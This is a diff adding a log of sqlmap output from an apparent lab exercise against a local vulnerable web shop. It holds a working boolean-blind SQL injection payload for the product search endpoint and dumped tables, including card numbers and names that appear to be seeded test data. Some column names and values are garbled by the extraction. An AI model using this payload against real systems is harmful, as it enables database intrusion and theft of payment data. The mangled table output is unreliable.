@@ -1,0 +1,77 @@
+sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 1505=1505 AND ('sULJ' LIKE 'sULJ
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 1505=1505 AND ('sULJ' LIKE 'sULJ
+---
+back-end DBMS: SQLite
+Database: <current>
+Table: Cards
+[6 entries]
++----+--------+------------------+---------+----------+------------------+--------------------------------+--------------------------------+
+| id | UserId | cardNum          | expYear | expMonth | fullName         | createdAt                      | updatedAt                      |
++----+--------+------------------+---------+----------+------------------+--------------------------------+--------------------------------+
+| 1  | 4      | 4815205605542754 | 2092    | 12       | Bjoern Kimminich | 2026-03-09 17:22:35.573 +00:00 | 2026-03-09 17:22:35.573 +00:00 |
+| 2  | 17     | 1234567812345678 | 2099    | 12       | Tim Tester       | 2026-03-09 17:22:35.597 +00:00 | 2026-03-09 17:22:35.597 +00:00 |
+| 3  | 1      | 4716190207394368 | 2081    | 2        | Administrator    | 2026-03-09 17:22:35.599 +00:00 | 2026-03-09 17:22:35.599 +00:00 |
+| 4  | 1      | 4024007105648108 | 2086    | 4        | Administrator    | 2026-03-09 17:22:35.599 +00:00 | 2026-03-09 17:22:35.599 +00:00 |
+| 5  | 2      | 5107891722278705 | 2099    | 11       | Jim              | 2026-03-09 17:22:35.601 +00:00 | 2026-03-09 17:22:35.601 +00:00 |
+| 6  | 3      | 4716943969046208 | 2081    | 2        | Bender           | 2026-03-09 17:22:35.602 +00:00 | 2026-03-09 17:22:35.602 +00:00 |
++----+--------+------------------+---------+----------+------------------+--------------------------------+--------------------------------+
+
+Database: <current>
+Table: Wallets
+[26 entries]
++--------+
+| UdddId |
++--------+
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
+| NULL   |
++--------+
+
+Database: <current>
+Table: Baskets
+[5 entries]
++---------+---------+
+| dd      | cddddd  |
++---------+---------+
+| <blank> | <blank> |
+| <blank> | <blank> |
+| <blank> | <blank> |
+| <blank> | <blank> |
+| <blank> | <blank> |
++---------+---------+
+
